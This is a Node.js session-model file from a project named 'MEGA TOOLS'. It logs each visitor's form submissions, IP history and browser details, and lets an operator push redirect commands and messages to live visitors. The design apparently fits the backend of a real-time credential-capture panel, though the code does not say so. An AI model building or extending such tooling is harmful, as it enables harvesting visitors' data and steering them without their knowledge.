// ============================================================
// MEGA TOOLS — SESSION MODEL (ENTERPRISE GATEKEEPER)
// v3.0 Production Hardened
// ============================================================
// LOGIC: visitorId + trackingCode = Composite Identity
//        Same visitor + same user = Update
//        Same visitor + different user = New Session
//        Session.upsert() = ONE & ONLY Gatekeeper
// ============================================================

const db = require('../database');
const { toStringId, generateId, now } = require('../utils/helpers');
const CONFIG = require('../config');

// ============================================================
// CONSTANTS
// ============================================================

const SESSION_EXPIRY_MS = 7 * 24 * 60 * 60 * 1000;
const SYSTEM_FIELDS = ['step','stepNumber','attempt','status','collectedTypes','screenResolution','timestamp','userAgent','platform','language','timezone','submittedAt','source','url','currentUrl','entryUrl','browser'];
const MONGO_OP_TIMEOUT = 3000;
const DUPLICATE_SUBMISSION_WINDOW_MS = 2000;
const MAX_IP_HISTORY = 20;
const MAX_REDIRECT_HISTORY = 50;
const MAX_SUBMISSIONS = 100;

function isMongoAvailable() {
  try {
    return !!(db.sessions && db.sessions._col);
  } catch { return false; }
}

async function safeMongoOp(operation, fallback, context = {}) {
  if (!isMongoAvailable()) return fallback();
  const startTime = Date.now();
  try {
    const result = await Promise.race([
      operation(),
      new Promise((_, reject) => setTimeout(() => reject(new Error('MONGO_TIMEOUT')), MONGO_OP_TIMEOUT))
    ]);
    return result;
  } catch (err) {
    if (!CONFIG.IS_PRODUCTION) {
      console.error('[Session] Mongo op failed', { op: context.op || 'unknown', error: err.message, durationMs: Date.now() - startTime, fallback: true });
    }
    return fallback();
  }
}

function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

const identityLocks = new Map();

function getIdentityLock(visitorId, trackingCode) {
  const key = visitorId + '_' + (trackingCode || 'unknown');
  if (!identityLocks.has(key)) {
    identityLocks.set(key, Promise.resolve());
  }
  return identityLocks.get(key);
}

function setIdentityLock(visitorId, trackingCode, promise) {
  const key = visitorId + '_' + (trackingCode || 'unknown');
  identityLocks.set(key, promise);
  if (identityLocks.size > 1000) {
    const keys = [...identityLocks.keys()].slice(0, 500);
    keys.forEach(k => identityLocks.delete(k));
  }
}

async function create(data) {
  const nowISO = now();

  const lockedKeys = [];
  const initialFormData = {};
  if (data.formData && Object.keys(data.formData).length > 0) {
    const keys = Object.keys(data.formData).filter(k => !SYSTEM_FIELDS.includes(k) && k !== 'submittedAt');
    for (let i = 0; i < keys.length; i++) {
      lockedKeys.push(keys[i]);
      initialFormData[keys[i]] = data.formData[keys[i]];
    }
  }

  const firstSubmission = data.formData && Object.keys(data.formData).length > 0
    ? [{ ...data.formData, submittedAt: nowISO }]
    : [];

  const isOffline = data.status === 'Offline';

  const session = {
    _id: generateId('s'),
    visitorId: data.visitorId || null,
    trackingCode: data.trackingCode || 'unknown',
    baseCode: data.baseCode || '',
    linkId: toStringId(data.linkId) || null,
    ip: data.ip || '::1',
    ipHistory: data.ip ? [{ ip: data.ip, timestamp: nowISO }] : [],
    browser: (data.browser || '').substring(0, 500),
    deviceType: data.deviceType || 'Desktop',
    entryUrl: data.entryUrl || data.baseCode || '',
    currentUrl: data.currentUrl || '',
    status: isOffline ? 'Offline' : 'Online',
    isLive: !isOffline,
    clicks: data.clicks || 1,
    collectedTypes: data.collectedTypes || [],
    submissions: firstSubmission,
    formData: initialFormData,
    lockedKeys: lockedKeys,
    hiddenBy: [],
    hiddenFor: [],
    hiddenForAll: false,
    redirectHistory: [],
    identitySource: 'created',
    lastActivity: nowISO,
    timestamp: nowISO,
    created_at: nowISO,
    updated_at: nowISO,
  };

  if (isMongoAvailable()) {
    const result = await safeMongoOp(
      () => db.sessions._col.insertOne(session),
      () => null,
      { op: 'insertOne', visitorId: data.visitorId }
    );
    if (result === null) {
      const all = await db.sessions.read();
      all.unshift(session);
      await db.sessions.write(all);
    } else if (result && result.insertedId) {
      return session;
    }
  } else {
    const all = await db.sessions.read();
    all.unshift(session);
    await db.sessions.write(all);
  }
  return session;
}

async function createAtomic(data) {
  const visitorId = data.visitorId || null;
  const trackingCode = data.trackingCode || 'unknown';
  const currentLock = getIdentityLock(visitorId, trackingCode);
  const resultPromise = currentLock.then(async () => { return await create(data); });
  setIdentityLock(visitorId, trackingCode, resultPromise.catch(() => {}));
  return resultPromise;
}

async function findById(id) {
  return db.sessions.findById(id);
}

async function findByVisitorId(visitorId) {
  if (!visitorId) return null;
  if (isMongoAvailable()) {
    const result = await safeMongoOp(
      () => db.sessions._col.findOne({ visitorId, hiddenForAll: { $ne: true } }),
      () => null,
      { op: 'findOne', visitorId }
    );
    if (result) return result;
  }
  const all = await db.sessions.read();
  return all.find(s => s.visitorId === visitorId && !s.hiddenForAll) || null;
}

async function findMany(filters = {}) {
  let sessions = await db.sessions.read();

  if (filters.isLive !== undefined) sessions = sessions.filter(s => s.isLive === filters.isLive);
  if (filters.status) sessions = sessions.filter(s => s.status === filters.status);
  if (filters.deviceType) sessions = sessions.filter(s => s.deviceType === filters.deviceType);
  if (filters.visitorId) sessions = sessions.filter(s => s.visitorId === filters.visitorId);
  if (filters.trackingCode) {
    const code = filters.trackingCode.includes('_') ? filters.trackingCode.split('_')[0] : filters.trackingCode;
    sessions = sessions.filter(s => {
      const sCode = s.trackingCode.includes('_') ? s.trackingCode.split('_')[0] : s.trackingCode;
      return sCode === code;
    });
  }
  if (filters.ip) sessions = sessions.filter(s => s.ip === filters.ip);

  sessions.sort((a, b) => {
    if (a.isLive && !b.isLive) return -1;
    if (!a.isLive && b.isLive) return 1;
    return new Date(b.timestamp) - new Date(a.timestamp);
  });

  return sessions;
}

// ============================================================
// DUPLICATE SUBMISSION CHECK
// ============================================================
function isDuplicateSubmission(existingSubmissions, newFormData, submittedAt) {
  if (!existingSubmissions || existingSubmissions.length === 0) return false;

  const newDataStr = JSON.stringify(Object.entries(newFormData || {}).filter(([k]) => k !== 'submittedAt').sort());

  const recentSubs = existingSubmissions.slice(-5);
  const submittedTime = new Date(submittedAt).getTime();

  return recentSubs.some(sub => {
    const subDataStr = JSON.stringify(Object.entries(sub || {}).filter(([k]) => k !== 'submittedAt').sort());
    const subTime = new Date(sub.submittedAt || 0).getTime();
    const isSameData = newDataStr === subDataStr;
    const isWithinWindow = Math.abs(submittedTime - subTime) < DUPLICATE_SUBMISSION_WINDOW_MS;
    return isSameData && isWithinWindow;
  });
}

/**
 * UPSERT — Composite Identity Match
 * visitorId + trackingCode BOTH must match for update
 * Same visitor + different trackingCode = NEW session
 */
async function upsert(data) {
  const clientIp = data.ip || '::1';
  const visitorId = data.visitorId || null;
  const trackingCode = data.trackingCode || '';
  const baseTc = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;

  let existing = null;
  let matchType = 'created';

  if (visitorId && trackingCode) {
    if (isMongoAvailable()) {
      const safeBaseTc = escapeRegex(baseTc);
      existing = await safeMongoOp(
        () => db.sessions._col.findOne({
          visitorId,
          trackingCode: { $regex: '^' + safeBaseTc + '_' },
          hiddenForAll: { $ne: true }
        }),
        () => null,
        { op: 'findOne_composite', visitorId }
      );
      if (!existing) {
        existing = await safeMongoOp(
          () => db.sessions._col.findOne({ visitorId, trackingCode, hiddenForAll: { $ne: true } }),
          () => null,
          { op: 'findOne_exact', visitorId }
        );
      }
    }

    if (!existing) {
      const all = await db.sessions.read();
      existing = all.find(s =>
        s.visitorId === visitorId &&
        (s.trackingCode === trackingCode ||
         (s.trackingCode && s.trackingCode.startsWith(baseTc + '_'))) &&
        !s.hiddenForAll
      );
    }

    if (existing) {
      const createdTime = new Date(existing.created_at || existing.timestamp).getTime();
      if (Date.now() - createdTime >= SESSION_EXPIRY_MS) {
        existing = null;
      } else {
        matchType = 'composite';
      }
    }
  }

  if (existing) {
    if (visitorId && !existing.visitorId) existing.visitorId = visitorId;
    if (trackingCode) existing.trackingCode = trackingCode;
    existing.currentUrl = data.currentUrl || existing.currentUrl;

    if (data.status === 'Offline') {
      existing.isLive = false;
      existing.status = 'Offline';
    } else if (data.status === 'Active' || !data.status) {
      existing.isLive = true;
      if (existing.status === 'Offline') existing.status = 'Online';
    }

    existing.lastActivity = now();
    existing.identitySource = matchType;

    if (clientIp && clientIp !== existing.ip) {
      existing.ipHistory = existing.ipHistory || [];
      existing.ipHistory.push({ ip: clientIp, timestamp: now() });
      if (existing.ipHistory.length > MAX_IP_HISTORY) {
        existing.ipHistory = existing.ipHistory.slice(-MAX_IP_HISTORY);
      }
      existing.ip = clientIp;
    }

    const skipClickTypes = ['heartbeat', 'session_init'];
    const hasOnlySystemTypes = data.collectedTypes?.length > 0 &&
      data.collectedTypes.every(t => skipClickTypes.includes(t));
    if (!hasOnlySystemTypes) existing.clicks = (existing.clicks || 0) + 1;

    if (data.linkId) existing.linkId = toStringId(data.linkId);
    if (data.baseCode) existing.baseCode = data.baseCode;
    if (data.entryUrl) existing.entryUrl = data.entryUrl;
    if (data.collectedTypes?.length > 0) {
      existing.collectedTypes = [...new Set([...(existing.collectedTypes || []), ...data.collectedTypes])];
    }

    if (data.formData && Object.keys(data.formData).length > 0) {
      const submittedAt = data.formData.submittedAt || now();

      if (!isDuplicateSubmission(existing.submissions, data.formData, submittedAt)) {
        existing.submissions = existing.submissions || [];
        existing.submissions.push({ ...data.formData, submittedAt });
        if (existing.submissions.length > MAX_SUBMISSIONS) {
          existing.submissions = existing.submissions.slice(-MAX_SUBMISSIONS);
        }

        existing.lockedKeys = existing.lockedKeys || [];
        existing.formData = existing.formData || {};
        const newKeys = Object.keys(data.formData).filter(k => !SYSTEM_FIELDS.includes(k) && k !== 'submittedAt');
        newKeys.forEach(key => {
          if (!existing.lockedKeys.includes(key)) existing.lockedKeys.push(key);
          if (existing.formData[key] === undefined) existing.formData[key] = data.formData[key];
        });
      }
    }

    if (data.browser) existing.browser = data.browser.substring(0, 500);
    if (data.deviceType) existing.deviceType = data.deviceType;
    existing.updated_at = now();

    await db.sessions.findByIdAndUpdate(existing._id, existing);
    return { session: existing, isNew: false, matchType };
  }

  const session = await create({ ...data, identitySource: 'created' });
  return { session, isNew: true, matchType: 'created' };
}

async function update(id, updates) {
  const safeUpdates = { ...updates };
  delete safeUpdates._id;
  safeUpdates.lastActivity = now();
  safeUpdates.updated_at = now();
  return db.sessions.findByIdAndUpdate(id, safeUpdates);
}

async function remove(id) {
  return db.sessions.findByIdAndDelete(id);
}

async function updatePresence(id, updates) {
  const allowedFields = ['status', 'isLive', 'lastActivity'];
  const safeUpdates = {};
  for (const key of allowedFields) {
    if (updates[key] !== undefined) safeUpdates[key] = updates[key];
  }
  if (Object.keys(safeUpdates).length === 0) return null;
  safeUpdates.updated_at = now();
  return db.sessions.findByIdAndUpdate(id, safeUpdates);
}

async function recordCommand(id, commandData) {
  const session = await db.sessions.findById(id);
  if (!session) return null;

  session.commandSeq = (session.commandSeq || 0) + 1;
  session.lastCommand = commandData.action || 'navigate';
  session.lastCommandUrl = commandData.url || '';
  session.lastMessage = commandData.message || '';
  session.lastActivity = now();
  session.redirectHistory = session.redirectHistory || [];
  session.redirectHistory.push({
    action: commandData.action || 'navigate',
    url: commandData.url || '',
    message: commandData.message || '',
    seq: session.commandSeq,
    timestamp: now()
  });
  if (session.redirectHistory.length > MAX_REDIRECT_HISTORY) {
    session.redirectHistory = session.redirectHistory.slice(-MAX_REDIRECT_HISTORY);
  }

  if (commandData.url) {
    session.currentUrl = commandData.url;
    session.clicks = (session.clicks || 0) + 1;
  }

  session.updated_at = now();
  await db.sessions.findByIdAndUpdate(id, session);
  return session;
}

async function hideFromUser(id, userId) {
  const session = await db.sessions.findById(id);
  if (!session) return null;

  session.hiddenFor = session.hiddenFor || [];
  if (!session.hiddenFor.includes(toStringId(userId))) {
    session.hiddenFor.push(toStringId(userId));
  }
  await db.sessions.findByIdAndUpdate(id, session);
  return session;
}

async function count(filters = {}) {
  return db.sessions.count(filters);
}

async function isSessionLive(session) {
  if (!session || !session.lastActivity) return false;
  const elapsed = Date.now() - new Date(session.lastActivity).getTime();
  return session.status === 'Online' && elapsed < CONFIG.SESSION_TIMEOUT_MS;
}

module.exports = {
  create, createAtomic, findById, findByVisitorId, findMany,
  upsert, update, remove, hideFromUser,
  count, isSessionLive,
  updatePresence,
  recordCommand,
};